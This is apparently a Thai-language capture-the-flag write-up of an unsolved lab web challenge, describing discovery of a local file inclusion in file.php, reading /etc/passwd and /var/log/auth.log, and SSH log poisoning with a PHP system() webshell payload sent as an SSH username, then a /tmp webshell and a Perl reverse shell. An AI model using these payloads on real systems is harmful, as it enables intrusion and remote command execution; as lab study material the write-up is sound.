## ข้อ Log Christmas

> 🏆 **Challenge**: ![Solved](https://img.shields.io/badge/status-unsolved-red)  
> 💪 **Difficulty**:  🟢 EASY   
> 🎯 **Category**: Web Application Security

<img src="./resources/63.png" alt="" style="width:60% !important;">

### เริ่มต้นการวิเคราะห์...
การสแกน path ด้วย Dirsearch พบ path สำคัญ: **/public** 🔍

<img src="./resources/64.png" alt="" style="width:60% !important;">


จากการตรวจสอบใน path **/public** ต่อ พบไฟล์ที่น่าสนใจ: **file.php** 🎯

<img src="./resources/66.png" alt="" style="width:60% !important;">

ลอง FUZZ parameter ด้วยเครื่องมือ x8 ปรากฏว่าเจอ parameter **file** ซึ่งอาจเสี่ยงต่อ **Local File Inclusion (LFI)** เอ๊ะใช่หรือไม่?! 😱

<img src="./resources/67.png" alt="" style="width:60% !important;">


## ขั้นตอนการทดสอบเริ่มต้น

ทดลองใส่ค่า parameter **file=/etc/passwd** 
พบว่าสามารถอ่านเนื้อหาไฟล์ได้! 🕵️‍♂️

<img src="./resources/68.png" alt="" style="width:60% !important;">

เมื่อดูโค้ดของไฟล์ **file.php** พบว่าโค้ดเพียงรับ parameter `file` และใช้งาน function **include** แบบตรงไปตรงมา 🤔

<img src="./resources/69.png" alt="" style="width:60% !important;">
<img src="./resources/70.png" alt="" style="width:60% !important;">

หลังวิเคราะห์เพิ่มเติม โจทย์น่าจะเกี่ยวข้องกับ **Log Files**  ซึ่งพบไฟล์น่าสนใจ: **/var/log/auth.log** แต่! Server ตอบกลับมาว่า: `Memory ไม่พอ` 🧠💥


**การแก้ไขปัญหาเบื้องต้น:**
ลอง **restart VM** และสำเร็จ! กลับมาอ่านไฟล์ **/var/log/auth.log** ได้ 🥳

## ขั้นตอนการโจมตี

จากไฟล์ /var/log/auth.log พบว่าเป็น log ของ SSH แนวทางต่อไปคือการทดลอง **SSH Log Poisoning**:
1. ใช้คำสั่ง `ssh '<?php system($_GET['c']); ?>'@192.168.1.129`
2. แต่ติดปัญหา Kali ไม่รองรับคำสั่งนี้! 😩

<img src="./resources/65.png" alt="" style="width:60% !important;">

จึงต้องเปลี่ยนมาใช้ **Python code** เชื่อมต่อ SSH แทน โดยส่งค่า username เป็น:
`<?php system($_GET['c']); ?>`
เป้าหมายคือ: Inject Code ผ่านช่องโหว่ LFI ใน **file.php**

<img src="./resources/75.png" alt="" style="width:60% !important;">

ดำเนินการใส่ค่า parameter **file=/var/log/auth.log** และ **c=command ที่ต้องการ** เช่น:

```
/file.php?file=/var/log/auth.log&c=ls
```
แต่ปัญหาใหญ่คือ /var/log/auth.log โหลดช้ามาก เนื่องจากมีขนาดใหญ่ขึ้นเรื่อย ๆ! 📂🐢

เพื่อแก้ปัญหานี้ จึงทำการสร้างไฟล์ webshell อันใหม่คือ **c.php** ไปวางไว้ใน directory **/tmp** แทนเพื่อความสะดวก ⚙️

ลองใช้คำสั่ง เช่น `ls`, `find` เพื่อตามหา Flag แต่ **ไม่พบไฟล์เป้าหมายใด ๆ** 🕳️😓

<img src="./resources/72.png" alt="" style="width:80% !important;">

จึงเปลี่ยนไปทดลอง Reverse Shell ผ่าน Perl สามารถ Shell ได้สำเร็จ 🎉 แต่ยังคงตามหา Flag ไม่เจอ 😢

<img src="./resources/73.png" alt="" style="width:60% !important;">
<img src="./resources/74.png" alt="" style="width:60% !important;">


**บทสรุป:**
แม้จะพลาดไป แต่ทุกขั้นตอนยังถือเป็นบทเรียนอันล้ำค่า! 🌟

---
<a href="./"><<กลับหน้าหลัก</a>
